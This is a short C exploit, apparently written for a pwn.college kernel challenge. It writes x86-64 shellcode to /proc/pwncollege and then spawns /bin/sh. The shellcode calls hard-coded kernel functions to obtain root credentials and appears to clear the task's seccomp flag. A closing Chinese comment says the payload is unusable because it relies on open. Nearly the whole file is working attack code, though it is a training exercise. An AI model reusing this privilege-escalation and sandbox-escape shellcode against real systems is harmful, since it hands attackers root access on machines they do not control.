#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode_bin[] = {
  0x48, 0x31, 0xff, 0x48, 0xc7, 0xc1, 0x60, 0x96, 0x08, 0x81, 0xff, 0xd1,
  0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc1, 0x10, 0x93, 0x08, 0x81, 0xff, 0xd1,
  0x65, 0x4c, 0x8b, 0x0c, 0x25, 0x00, 0x5d, 0x01, 0x00, 0x49, 0x81, 0x21,
  0xff, 0xfe, 0xff, 0xff, 0x31, 0xc0, 0xc3
};
unsigned int shellcode_bin_len = 43;

int main() {
  int fd = open("/proc/pwncollege", O_RDWR);

  write(3, shellcode_bin, shellcode_bin_len);

  execl("/bin/sh", "/bin/sh", 0);

  return 0;
}


// 用到了 open，所以這個 payload 不能用！